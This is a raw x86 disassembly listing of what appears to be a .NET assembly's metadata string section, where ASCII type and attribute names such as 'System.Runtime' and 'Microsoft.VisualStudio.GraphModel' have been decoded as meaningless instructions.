  4042b5:	imul   ebp,DWORD PTR [esi+0x67],0x4c4f4e5f
  4042bc:	dec    edi
  4042bd:	inc    ebx
  4042be:	pop    edi
  4042bf:	add    BYTE PTR [ebx+0x77],dl
  4042c2:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x6575515f
  4042ca:	jae    0x404340
  4042cc:	imul   ebp,DWORD PTR [edi+0x6e],0x4c4f4e5f
  4042d3:	dec    edi
  4042d4:	inc    ebx
  4042d5:	pop    edi
  4042d6:	add    BYTE PTR [ebx+0x77],dl
  4042d9:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x4349555f
  4042e1:	jne    0x40434f
  4042e3:	je     0x40435a
  4042e5:	jb     0x40434c
  4042e7:	pop    edi
  4042e8:	dec    esi
  4042e9:	dec    edi
  4042ea:	dec    esp
  4042eb:	dec    edi
  4042ec:	inc    ebx
  4042ed:	pop    edi
  4042ee:	add    BYTE PTR [ebx+0x79],dl
  4042f1:	outs   dx,BYTE PTR ds:[esi]
  4042f2:	je     0x404355
  4042f4:	js     0x4042f6
  4042f6:	dec    ebp
  4042f7:	popa   
  4042f8:	push   0x6f
  4042fa:	jb     0x404352
  4042fc:	gs jb  0x404372
  4042ff:	imul   ebp,DWORD PTR [edi+0x6e],0x6e694d00
  404306:	outs   dx,DWORD PTR ds:[esi]
  404307:	jb     0x40435f
  404309:	gs jb  0x40437f
  40430c:	imul   ebp,DWORD PTR [edi+0x6e],0x6f725000
  404313:	fs jne 0x404379
  404316:	je     0x40436e
  404318:	gs jb  0x40438e
  40431b:	imul   ebp,DWORD PTR [edi+0x6e],0x67726100
  404322:	jae    0x404324
  404324:	jbe    0x404387
  404326:	ins    BYTE PTR es:[edi],dx
  404327:	jne    0x40438e
  404329:	add    BYTE PTR [ecx+0x72],ah
  40432c:	addr16 dec ebx
  40432e:	imul   ebp,DWORD PTR [esi+0x64],0x67726100
  404335:	dec    ecx
  404336:	outs   dx,BYTE PTR ds:[esi]
  404337:	fs gs js 0x40433b
  40433b:	popa   
  40433c:	jb     0x4043a5
  40433e:	jne    0x4043ad
  404340:	outs   dx,BYTE PTR gs:[esi]
  404342:	je     0x404344
  404344:	jae    0x4043ab
  404346:	arpl   WORD PTR [edi+0x6e],bp
  404349:	fs inc ecx
  40434b:	jb     0x4043b4
  40434d:	add    BYTE PTR [eax+0x0],dh
  404350:	push   ebx
  404351:	jns    0x4043c6
  404353:	je     0x4043ba
  404355:	ins    DWORD PTR es:[edi],dx
  404356:	cs push edx
  404358:	jne    0x4043c8
  40435a:	je     0x4043c5
  40435c:	ins    DWORD PTR es:[edi],dx
  40435d:	gs cs push esi
  404360:	gs jb  0x4043d6
  404363:	imul   ebp,DWORD PTR [edi+0x6e],0x676e69
  40436a:	push   esp
  40436b:	popa   
  40436c:	jb     0x4043d5
  40436e:	gs je  0x4043b7
  404371:	jb     0x4043d4
  404373:	ins    DWORD PTR es:[edi],dx
  404374:	gs ja  0x4043e6
  404377:	jb     0x4043e4
  404379:	inc    ecx
  40437a:	je     0x4043f0
  40437c:	jb     0x4043e7
  40437e:	bound  esi,QWORD PTR [ebp+0x74]
  404381:	add    BYTE PTR gs:[ebx+0x79],dl
  404385:	jae    0x4043fb
  404387:	gs ins DWORD PTR es:[edi],dx
  404389:	cs push edx
  40438b:	jne    0x4043fb
  40438d:	je     0x4043f8
  40438f:	ins    DWORD PTR es:[edi],dx
  404390:	gs cs dec ecx
  404393:	outs   dx,BYTE PTR ds:[esi]
  404394:	je     0x4043fb
  404396:	jb     0x404407
  404398:	jo     0x4043ed
  40439a:	gs jb  0x404413
  40439d:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
  4043a4:	ins    DWORD PTR es:[edi],dx
  4043a5:	push   esi
  4043a6:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  4043ad:	je     0x404423
  4043af:	jb     0x40441a
  4043b1:	bound  esi,QWORD PTR [ebp+0x74]
  4043b4:	add    BYTE PTR gs:[ebx+0x4c],al
  4043b8:	push   ebx
  4043b9:	inc    ebx
  4043ba:	outs   dx,DWORD PTR ds:[esi]
  4043bb:	ins    DWORD PTR es:[edi],dx
  4043bc:	jo     0x40442a
  4043be:	imul   esp,DWORD PTR [ecx+0x6e],0x74744174
  4043c5:	jb     0x404430
  4043c7:	bound  esi,QWORD PTR [ebp+0x74]
  4043ca:	add    BYTE PTR gs:[ebx+0x79],dl
  4043ce:	jae    0x404444
  4043d0:	gs ins DWORD PTR es:[edi],dx
  4043d2:	cs push edx
  4043d4:	gs data16 ins BYTE PTR es:[edi],dx
  4043d7:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4043dc:	outs   dx,BYTE PTR ds:[esi]
  4043dd:	add    BYTE PTR [ecx+0x73],al
  4043e0:	jae    0x404447
  4043e2:	ins    DWORD PTR es:[edi],dx
  4043e3:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  4043e7:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  4043ef:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4043f6:	jae    0x40446b
  4043f8:	gs ins DWORD PTR es:[edi],dx
  4043fa:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  4043fe:	gs jae 0x404464
  404401:	jb     0x40446c
  404403:	jo     0x404479
  404405:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  40440c:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  404413:	jae    0x404488
  404415:	gs ins DWORD PTR es:[edi],dx
  404417:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  40441b:	gs popaw 
  40441e:	jne    0x40448c
  404420:	je     0x404463
  404422:	ins    BYTE PTR es:[edi],dx
  404423:	imul   esp,DWORD PTR [ecx+0x73],0x72747441
  40442a:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  404431:	jae    0x4044a6
  404433:	gs ins DWORD PTR es:[edi],dx
  404435:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  404439:	outs   dx,DWORD PTR ds:[esi]
  40443a:	ins    DWORD PTR es:[edi],dx
  40443b:	jo     0x40449e
  40443d:	outs   dx,BYTE PTR ds:[esi]
  40443e:	jns    0x404481
  404440:	je     0x4044b6
  404442:	jb     0x4044ad
  404444:	bound  esi,QWORD PTR [ebp+0x74]
  404447:	add    BYTE PTR gs:[ecx+0x73],al
  40444b:	jae    0x4044b2
  40444d:	ins    DWORD PTR es:[edi],dx
  40444e:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  404452:	jb     0x4044c3
  404454:	fs jne 0x4044ba
  404457:	je     0x40449a
  404459:	je     0x4044cf
  40445b:	jb     0x4044c6
  40445d:	bound  esi,QWORD PTR [ebp+0x74]
  404460:	add    BYTE PTR gs:[ecx+0x73],al
  404464:	jae    0x4044cb
  404466:	ins    DWORD PTR es:[edi],dx
  404467:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  40446b:	outs   dx,DWORD PTR ds:[esi]
  40446c:	jo     0x4044e7
  40446e:	jb     0x4044d9
  404470:	addr16 push 0x74744174
  404476:	jb     0x4044e1
  404478:	bound  esi,QWORD PTR [ebp+0x74]
  40447b:	add    BYTE PTR gs:[ecx+0x73],al
  40447f:	jae    0x4044e6
  404481:	ins    DWORD PTR es:[edi],dx
  404482:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  404486:	gs jb  0x4044fc
  404489:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  404490:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  404497:	jae    0x40450c
  404499:	gs ins DWORD PTR es:[edi],dx
  40449b:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  40449f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  4044a7:	outs   dx,DWORD PTR ds:[esi]
  4044a8:	outs   dx,BYTE PTR ds:[esi]
  4044a9:	inc    ecx
  4044aa:	je     0x404520
  4044ac:	jb     0x404517
  4044ae:	bound  esi,QWORD PTR [ebp+0x74]
  4044b1:	add    BYTE PTR gs:[ecx+0x73],al
  4044b5:	jae    0x40451c
  4044b7:	ins    DWORD PTR es:[edi],dx
  4044b8:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  4044bc:	outs   dx,BYTE PTR ds:[esi]
  4044bd:	outs   dx,WORD PTR ds:[esi]
  4044bf:	jb     0x40452e
  4044c1:	popa   
  4044c2:	je     0x40452d
  4044c4:	outs   dx,DWORD PTR ds:[esi]
  4044c5:	outs   dx,BYTE PTR ds:[esi]
  4044c6:	popa   
  4044c7:	ins    BYTE PTR es:[edi],dx
  4044c8:	push   esi
  4044c9:	gs jb  0x40453f
  4044cc:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4044d3:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  4044da:	popa   
  4044db:	je     0x404542
  4044dd:	ins    BYTE PTR es:[edi],dx
  4044de:	ins    BYTE PTR es:[edi],dx
  4044df:	imul   esi,DWORD PTR [ebp+eiz*2+0x43],0x72746e6f
  4044e7:	popa   
  4044e8:	arpl   WORD PTR [esi+edx*2+0x65],si
  4044ec:	jb     0x404561
  4044ee:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4044f5:	imul   esp,DWORD PTR [edx+0x75],0x4e006574
  4044fc:	gs jne 0x404573
  4044ff:	jb     0x404562
  404501:	ins    BYTE PTR es:[edi],dx
  404502:	push   edx
  404503:	gs jae 0x404575
  404506:	jne    0x40457a
  404508:	arpl   WORD PTR [ebp+0x73],sp
  40450b:	dec    esp
  40450c:	popa   
  40450d:	outs   dx,BYTE PTR ds:[esi]
  40450e:	addr16 jne 0x404572
  404511:	addr16 gs inc ecx
  404514:	je     0x40458a
  404516:	jb     0x404581
  404518:	bound  esi,QWORD PTR [ebp+0x74]
  40451b:	add    BYTE PTR gs:[ecx+0x73],al
  40451f:	jae    0x404586
  404521:	ins    DWORD PTR es:[edi],dx
  404522:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  404526:	gs ins BYTE PTR es:[edi],dx
  404528:	popa   
  404529:	jns    0x40457e
  40452b:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  404532:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  404539:	jae    0x4045ae
  40453b:	gs ins DWORD PTR es:[edi],dx
  40453d:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  404541:	gs jns 0x40458a
  404544:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  40454c:	bound  esi,QWORD PTR [ebp+0x74]
  40454f:	add    BYTE PTR gs:[ecx+0x73],al
  404553:	jae    0x4045ba
  404555:	ins    DWORD PTR es:[edi],dx
  404556:	bound  ebp,QWORD PTR [ecx+edi*2+0x53]
  40455a:	imul   esp,DWORD PTR [edi+0x6e],0x72757461
  404561:	gs dec ebx
  404563:	gs jns 0x4045a7
  404566:	je     0x4045dc
  404568:	jb     0x4045d3
  40456a:	bound  esi,QWORD PTR [ebp+0x74]
  40456d:	add    BYTE PTR gs:[ebx+0x79],dl
  404571:	jae    0x4045e7
  404573:	gs ins DWORD PTR es:[edi],dx
  404575:	cs push edx
  404577:	jne    0x4045e7
  404579:	je     0x4045e4
  40457b:	ins    DWORD PTR es:[edi],dx
  40457c:	gs cs inc ebx
  40457f:	outs   dx,DWORD PTR ds:[esi]
  404580:	ins    DWORD PTR es:[edi],dx
  404581:	jo     0x4045ec
  404583:	ins    BYTE PTR es:[edi],dx
  404584:	gs jb  0x4045da
  404587:	gs jb  0x404600
  40458a:	imul   esp,DWORD PTR [ebx+0x65],0x75520073
  404591:	outs   dx,BYTE PTR ds:[esi]
  404592:	je     0x4045fd
  404594:	ins    DWORD PTR es:[edi],dx
  404595:	gs inc ebx
  404597:	outs   dx,DWORD PTR ds:[esi]
  404598:	ins    DWORD PTR es:[edi],dx
  404599:	jo     0x4045fc
  40459b:	je     0x404606
  40459d:	bound  ebp,QWORD PTR [ecx+0x6c]
  4045a0:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  4045a8:	bound  esi,QWORD PTR [ebp+0x74]
  4045ab:	add    BYTE PTR gs:[ebx+0x79],dl
  4045af:	jae    0x404625
  4045b1:	gs ins DWORD PTR es:[edi],dx
  4045b3:	cs inc esp
  4045b5:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  4045bc:	imul   esp,DWORD PTR [ebx+0x73],0x62654400
  4045c3:	jne    0x40462c
  4045c5:	addr16 popa 
  4045c7:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  4045cb:	je     0x404641
  4045cd:	jb     0x404638
  4045cf:	bound  esi,QWORD PTR [ebp+0x74]
  4045d2:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  4045d7:	jne    0x404640
  4045d9:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  4045e1:	jae    0x4045e3
  4045e3:	inc    ebx
  4045e4:	outs   dx,DWORD PTR ds:[esi]
  4045e5:	ins    DWORD PTR es:[edi],dx
  4045e6:	jo     0x404651
  4045e8:	ins    BYTE PTR es:[edi],dx
  4045e9:	popa   
  4045ea:	je     0x404655
  4045ec:	outs   dx,DWORD PTR ds:[esi]
  4045ed:	outs   dx,BYTE PTR ds:[esi]
  4045ee:	push   edx
  4045ef:	gs ins BYTE PTR es:[edi],dx
  4045f1:	popa   
  4045f2:	js     0x404655
  4045f4:	je     0x40465f
  4045f6:	outs   dx,DWORD PTR ds:[esi]
  4045f7:	outs   dx,BYTE PTR ds:[esi]
  4045f8:	jae    0x40463b
  4045fa:	je     0x404670
  4045fc:	jb     0x404667
  4045fe:	bound  esi,QWORD PTR [ebp+0x74]
  404601:	add    BYTE PTR gs:[ebx+0x54],dl
  404605:	inc    ecx
  404606:	push   esp
  404607:	push   0x64616572
  40460c:	inc    ecx
  40460d:	je     0x404683
  40460f:	jb     0x40467a
  404611:	bound  esi,QWORD PTR [ebp+0x74]
  404614:	add    BYTE PTR gs:[ebx+0x79],dl
  404618:	jae    0x40468e
  40461a:	gs ins DWORD PTR es:[edi],dx
  40461c:	cs push esp
  40461e:	push   0x64616572
  404623:	imul   ebp,DWORD PTR [esi+0x67],0x72685400
  40462a:	gs popa 
  40462c:	add    BYTE PTR fs:[edi+0x65],ah
  404630:	je     0x404691
  404632:	inc    ebx
  404633:	jne    0x4046a7
  404635:	jb     0x40469c
  404637:	outs   dx,BYTE PTR ds:[esi]
  404638:	je     0x40468e
  40463a:	push   0x64616572
  40463f:	add    BYTE PTR [ebp+0x69],cl
  404642:	arpl   WORD PTR [edx+0x6f],si
  404645:	jae    0x4046b6
  404647:	data16 je 0x404678
  40464a:	push   esi
  40464b:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  404652:	jne    0x4046b8
  404654:	imul   ebp,DWORD PTR [edi+0x2e],0x676f7250
  40465b:	jb     0x4046c2
  40465d:	jae    0x4046d2
  40465f:	imul   ebp,DWORD PTR [edi+0x6e],0x6d6f432e
  404666:	ins    DWORD PTR es:[edi],dx
  404667:	outs   dx,DWORD PTR ds:[esi]
  404668:	outs   dx,BYTE PTR ds:[esi]
  404669:	add    BYTE PTR [ebp+0x49],dl
  40466c:	push   esp
  40466d:	push   0x64616572
  404672:	add    BYTE PTR [ecx+0x6e],cl
  404675:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  40467d:	add    BYTE PTR [ebx+0x6f],al
  404680:	outs   dx,BYTE PTR ds:[esi]
  404681:	jae    0x4046f2
  404683:	ins    BYTE PTR es:[edi],dx
  404684:	add    BYTE PTR gs:[ebx+0x79],dl
  404688:	jae    0x4046fe
  40468a:	gs ins DWORD PTR es:[edi],dx
  40468c:	cs dec ecx
  40468e:	dec    edi
  40468f:	add    BYTE PTR [ebp+eiz*2+0x78],dl
  404693:	je     0x4046ec
  404695:	jb     0x404700
  404697:	je     0x4046fe
  404699:	jb     0x40469b
  40469b:	addr16 gs je 0x4046fe
  40469f:	inc    ebp
  4046a0:	jb     0x404714
  4046a2:	outs   dx,DWORD PTR ds:[esi]
  4046a3:	jb     0x4046a5
  4046a5:	inc    ebp
  4046a6:	js     0x40470b
  4046a8:	gs jo  0x40471f
  4046ab:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  4046b2:	pop    edi
  4046b3:	dec    ebp
  4046b4:	gs jae 0x40472a
  4046b7:	popa   
  4046b8:	add    BYTE PTR gs:[bx+0x72],dl
  4046bd:	imul   esi,DWORD PTR [ebp+eiz*2+0x4c],0x656e69
  4046c5:	inc    ebp
  4046c6:	outs   dx,BYTE PTR ds:[esi]
  4046c7:	jbe    0x404732
  4046c9:	jb     0x40473a
  4046cb:	outs   dx,BYTE PTR ds:[esi]
  4046cc:	ins    DWORD PTR es:[edi],dx
  4046cd:	outs   dx,BYTE PTR gs:[esi]
  4046cf:	je     0x4046d1
  4046d1:	inc    ebp
  4046d2:	js     0x40473d
  4046d4:	je     0x4046d6
  4046d6:	jae    0x40473d
  4046d8:	je     0x404739
  4046da:	inc    ebp
  4046db:	jb     0x40474f
  4046dd:	outs   dx,DWORD PTR ds:[esi]
  4046de:	jb     0x404733
  4046e0:	je     0x404754
  4046e2:	gs popa 
  4046e4:	ins    DWORD PTR es:[edi],dx
  4046e5:	add    BYTE PTR [edi+0x65],ah
  4046e8:	je     0x404749
  4046ea:	dec    edi
  4046eb:	jne    0x404761
  4046ed:	add    BYTE PTR [ebx+0x65],dh
  4046f0:	je     0x404751
  4046f2:	dec    edi
  4046f3:	jne    0x404769
  4046f5:	jo     0x40476c
  4046f7:	je     0x40474c
  4046f9:	je     0x40476d
  4046fb:	gs popa 
  4046fd:	ins    DWORD PTR es:[edi],dx
  4046fe:	add    BYTE PTR [ebp+0x78],al
  404701:	arpl   WORD PTR gs:[ebp+0x74],si
  404705:	add    BYTE PTR gs:[edi+0x65],ah
  404709:	je     0x40476a
  40470b:	inc    ebp
  40470c:	jb     0x404780
  40470e:	outs   dx,DWORD PTR ds:[esi]
  40470f:	jb     0x404754
  404711:	outs   dx,DWORD PTR ds:[esi]
  404712:	jne    0x404782
  404714:	je     0x404716
  404716:	push   ebx
  404717:	je     0x40478b
  404719:	imul   ebp,DWORD PTR [esi+0x67],0x4e734900
  404720:	jne    0x40478e
  404722:	ins    BYTE PTR es:[edi],dx
  404723:	dec    edi
  404724:	jb     0x40476b
  404726:	ins    DWORD PTR es:[edi],dx
  404727:	jo     0x40479d
  404729:	jns    0x40472b
  40472b:	push   esp
  40472c:	jb     0x404797
  40472e:	ins    DWORD PTR es:[edi],dx
  40472f:	add    BYTE PTR [edi+0x65],ah
  404732:	je     0x404793
  404734:	dec    esp
  404735:	outs   dx,BYTE PTR gs:[esi]
  404737:	addr16 je 0x4047a2
  40473a:	add    BYTE PTR [edi+0x65],ah
  40473d:	je     0x40479e
  40473f:	inc    ebx
  404740:	push   0x737261
  404745:	push   ebx
  404746:	jne    0x4047aa
  404748:	jae    0x4047be
  40474a:	jb     0x4047b5
  40474c:	outs   dx,BYTE PTR ds:[esi]
  40474d:	add    BYTE PTR [bp+di+0x6f],al
  404751:	outs   dx,BYTE PTR ds:[esi]
  404752:	arpl   WORD PTR [ecx+0x74],sp
  404755:	add    BYTE PTR [ebx+0x74],dl
  404758:	jb     0x4047c3
  40475a:	outs   dx,BYTE PTR ds:[esi]
  40475b:	addr16 inc ebx
  40475d:	outs   dx,DWORD PTR ds:[esi]
  40475e:	ins    DWORD PTR es:[edi],dx
  40475f:	jo     0x4047c2
  404761:	jb     0x4047cc
  404763:	jae    0x4047d4
  404765:	outs   dx,BYTE PTR ds:[esi]
  404766:	add    BYTE PTR [ebx+0x6f],al
  404769:	ins    DWORD PTR es:[edi],dx
  40476a:	jo     0x4047cd
  40476c:	jb     0x4047d3
  40476e:	add    BYTE PTR [ebx+0x65],dh
  404771:	je     0x4047d2
  404773:	inc    edi
  404774:	popa   
  404775:	je     0x4047df
  404777:	gs jb  0x4047bb
  40477a:	ins    BYTE PTR es:[edi],dx
  40477b:	ins    BYTE PTR es:[edi],dx
  40477c:	push   edx
  40477d:	gs jae 0x4047f5
  404780:	ins    BYTE PTR es:[edi],dx
  404781:	je     0x4047f6
  404783:	add    BYTE PTR [ebx+0x65],dh
  404786:	je     0x4047e7
  404788:	inc    edi
  404789:	popa   
  40478a:	je     0x4047f4
  40478c:	gs jb  0x4047d0
  40478f:	ins    BYTE PTR es:[edi],dx
  404790:	ins    BYTE PTR es:[edi],dx
  404791:	inc    ebp
  404792:	js     0x4047f7
  404794:	gs jo  0x40480b
  404797:	imul   ebp,DWORD PTR [edi+0x6e],0x79530073
  40479e:	jae    0x404814
  4047a0:	gs ins DWORD PTR es:[edi],dx
  4047a2:	cs inc ebx
  4047a4:	outs   dx,DWORD PTR ds:[esi]
  4047a5:	ins    BYTE PTR es:[edi],dx
  4047a6:	ins    BYTE PTR es:[edi],dx
  4047a7:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4047ac:	outs   dx,BYTE PTR ds:[esi]
  4047ad:	jae    0x4047dd
  4047af:	inc    edi
  4047b0:	outs   dx,BYTE PTR gs:[esi]
  4047b2:	gs jb  0x40481e
  4047b5:	arpl   WORD PTR [eax],ax
  4047b7:	dec    esp
  4047b8:	imul   esi,DWORD PTR [ebx+0x74],0x67003160
  4047bf:	gs je  0x404821
  4047c2:	dec    ecx
  4047c3:	outs   dx,BYTE PTR ds:[esi]
  4047c4:	jo     0x40483b
  4047c6:	je     0x40480e
  4047c8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x73],0x64644100
  4047d0:	add    BYTE PTR [ebx+0x65],dh
  4047d3:	je     0x404834
  4047d5:	dec    edi
  4047d6:	jne    0x40484c
  4047d8:	jo     0x40484f
  4047da:	je     0x404822
  4047dc:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x5f746573
  4047e4:	dec    edi
  4047e5:	jne    0x40485b
  4047e7:	jo     0x40485e
  4047e9:	je     0x404831
  4047eb:	outs   dx,DWORD PTR ds:[esi]
  4047ec:	jb     0x40485b
  4047ee:	popa   
  4047ef:	je     0x4047f1
  4047f1:	push   ecx
  4047f2:	jne    0x404859
  4047f4:	jb     0x40486f
  4047f6:	push   ebx
  4047f7:	jo     0x40485e
  4047f9:	arpl   WORD PTR [ecx+0x66],bp
  4047fc:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  404803:	add    BYTE PTR [edi+0x65],ah
  404806:	je     0x404867
  404808:	push   ecx
  404809:	jne    0x404870
  40480b:	jb     0x404886
  40480d:	push   ebx
  40480e:	jo     0x404875
  404810:	arpl   WORD PTR [ecx+0x66],bp
  404813:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40481a:	jae    0x40481c
  40481c:	jae    0x404883
  40481e:	je     0x40487f
  404820:	inc    ebx
  404821:	jne    0x404895
  404823:	jb     0x40488a
  404825:	outs   dx,BYTE PTR ds:[esi]
  404826:	je     0x40487d
  404828:	dec    ecx
  404829:	inc    ebx
  40482a:	jne    0x404898
  40482c:	je     0x4048a3
  40482e:	jb     0x404895
  404830:	add    BYTE PTR [ecx+0x72],al
  404833:	addr16 jne 0x4048a3
  404836:	outs   dx,BYTE PTR gs:[esi]
  404838:	je     0x404888
  40483a:	jne    0x4048a8
  40483c:	ins    BYTE PTR es:[edi],dx
  40483d:	inc    ebp
  40483e:	js     0x4048a3
  404840:	gs jo  0x4048b7
  404843:	imul   ebp,DWORD PTR [edi+0x6e],0x67724100
  40484a:	jne    0x4048b9
  40484c:	outs   dx,BYTE PTR gs:[esi]
  40484e:	je     0x404895
  404850:	js     0x4048b5
  404852:	gs jo  0x4048c9
  404855:	imul   ebp,DWORD PTR [edi+0x6e],0x646e4900
  40485c:	gs js  0x4048ae
  40485f:	data16 add BYTE PTR [ebp+0x69],cl
  404863:	arpl   WORD PTR [edx+0x6f],si
  404866:	jae    0x4048d7
  404868:	data16 je 0x404899
  40486b:	push   esi
  40486c:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  404873:	jne    0x4048d9
  404875:	imul   ebp,DWORD PTR [edi+0x2e],0x70617247
  40487c:	push   0x65646f4d
  404881:	ins    BYTE PTR es:[edi],dx
  404882:	add    BYTE PTR [edi+0x72],al
  404885:	popa   
  404886:	jo     0x4048f0
  404888:	push   eax
  404889:	popa   
  40488a:	je     0x4048f4
  40488c:	push   ebx
  40488d:	gs jb  0x4048f9
  404890:	popa   
  404891:	ins    BYTE PTR es:[edi],dx
  404892:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  404899:	inc    esp
  40489a:	imul   esp,DWORD PTR [ebx+0x74],0x616e6f69
  4048a1:	jb     0x40491c
  4048a3:	add    BYTE PTR [edi+0x65],ah
  4048a6:	je     0x404907
  4048a8:	inc    ebx
  4048a9:	outs   dx,DWORD PTR ds:[esi]
  4048aa:	ins    DWORD PTR es:[edi],dx
  4048ab:	ins    DWORD PTR es:[edi],dx
  4048ac:	outs   dx,DWORD PTR ds:[esi]
  4048ad:	outs   dx,BYTE PTR ds:[esi]
  4048ae:	push   eax
  4048af:	popa   
  4048b0:	je     0x40491a
  4048b2:	jae    0x4048b4
  4048b4:	push   esp
  4048b5:	jns    0x404927
  4048b7:	add    BYTE PTR gs:[edx+0x75],dl
  4048bb:	outs   dx,BYTE PTR ds:[esi]
  4048bc:	je     0x404927
  4048be:	ins    DWORD PTR es:[edi],dx
  4048bf:	gs push esp
  4048c1:	jns    0x404933
  4048c3:	gs dec eax
  4048c5:	popa   
  4048c6:	outs   dx,BYTE PTR ds:[esi]
  4048c7:	fs ins BYTE PTR es:[edi],dx
  4048c9:	add    BYTE PTR gs:[edi+0x65],al
  4048cd:	je     0x404923
  4048cf:	jns    0x404941
  4048d1:	gs inc esi
  4048d3:	jb     0x404944
  4048d5:	ins    DWORD PTR es:[edi],dx
  4048d6:	dec    eax
  4048d7:	popa   
  4048d8:	outs   dx,BYTE PTR ds:[esi]
  4048d9:	fs ins BYTE PTR es:[edi],dx
  4048db:	add    BYTE PTR gs:[eax+0x61],dl
  4048df:	jb     0x404954
  4048e1:	add    BYTE PTR gs:[edi+0x65],ah
  4048e5:	je     0x404946
  4048e7:	inc    ebx
  4048e8:	jne    0x40495c
  4048ea:	jb     0x404951
  4048ec:	outs   dx,BYTE PTR ds:[esi]
  4048ed:	je     0x404932
  4048ef:	jne    0x40495d
  4048f1:	je     0x404968
  4048f3:	jb     0x40495a
  4048f5:	add    BYTE PTR [ecx+0x46],cl
  4048f8:	outs   dx,DWORD PTR ds:[esi]
  4048f9:	jb     0x404968
  4048fb:	popa   
  4048fc:	je     0x40494e
  4048fe:	jb     0x40496f
  404900:	jbe    0x40496b
  404902:	fs gs jb 0x404906
  404906:	inc    esi
  404907:	outs   dx,DWORD PTR ds:[esi]
  404908:	jb     0x404977
  40490a:	popa   
  40490b:	je     0x40490d
  40490d:	push   ebx
  40490e:	jns    0x404983
  404910:	je     0x404977
  404912:	ins    DWORD PTR es:[edi],dx
  404913:	cs inc ebx
  404915:	outs   dx,DWORD PTR ds:[esi]
  404916:	fs gs inc esp
  404919:	outs   dx,DWORD PTR ds:[esi]
  40491a:	ins    DWORD PTR es:[edi],dx
  40491b:	cs inc ebx
  40491d:	outs   dx,DWORD PTR ds:[esi]
  40491e:	ins    DWORD PTR es:[edi],dx
  40491f:	jo     0x40498a
  404921:	ins    BYTE PTR es:[edi],dx
  404922:	gs jb  0x404925
  404925:	inc    edi
  404926:	outs   dx,BYTE PTR gs:[esi]
  404928:	gs jb  0x40498c
  40492b:	je     0x404992
  40492d:	fs inc ebx
  40492f:	outs   dx,DWORD PTR ds:[esi]
  404930:	fs gs inc ecx
  404933:	je     0x4049a9
  404935:	jb     0x4049a0
  404937:	bound  esi,QWORD PTR [ebp+0x74]
  40493a:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  40493f:	jne    0x4049a8
  404941:	addr16 gs jb 0x404993
  404945:	outs   dx,DWORD PTR ds:[esi]
  404946:	outs   dx,BYTE PTR ds:[esi]
  404947:	push   ebp
  404948:	jae    0x4049af
  40494a:	jb     0x40498f
  40494c:	outs   dx,DWORD PTR ds:[esi]
  40494d:	fs gs inc ecx
  404950:	je     0x4049c6
  404952:	jb     0x4049bd
  404954:	bound  esi,QWORD PTR [ebp+0x74]
  404957:	add    BYTE PTR gs:[ebx+0x6f],al
  40495b:	ins    DWORD PTR es:[edi],dx
  40495c:	jo     0x4049c7
  40495e:	ins    BYTE PTR es:[edi],dx
  40495f:	gs jb  0x4049a9
  404962:	outs   dx,BYTE PTR gs:[esi]
  404964:	gs jb  0x4049c8
  404967:	je     0x4049ce
  404969:	fs inc ecx
  40496b:	je     0x4049e1
  40496d:	jb     0x4049d8
  40496f:	bound  esi,QWORD PTR [ebp+0x74]
  404972:	add    BYTE PTR gs:[edx+0x65],dl
  404976:	data16 gs jb 0x4049df
  40497a:	outs   dx,BYTE PTR ds:[esi]
  40497b:	arpl   WORD PTR [ebp+0x45],sp
  40497e:	jno    0x4049f5
  404980:	popa   
  404981:	ins    BYTE PTR es:[edi],dx
  404982:	jae    0x404984
  404984:	inc    ecx
  404985:	jae    0x4049fa
  404987:	gs ins DWORD PTR es:[edi],dx
  404989:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  40498d:	addr16 gs je 0x4049f0
  404991:	inc    ecx
  404992:	jae    0x404a07
  404994:	gs ins DWORD PTR es:[edi],dx
  404996:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  40499a:	inc    edi
  40499b:	gs je  0x4049f1
  40499e:	je     0x404a12
  4049a0:	imul   ebp,DWORD PTR [esi+0x67],0x73795300
  4049a7:	je     0x404a0e
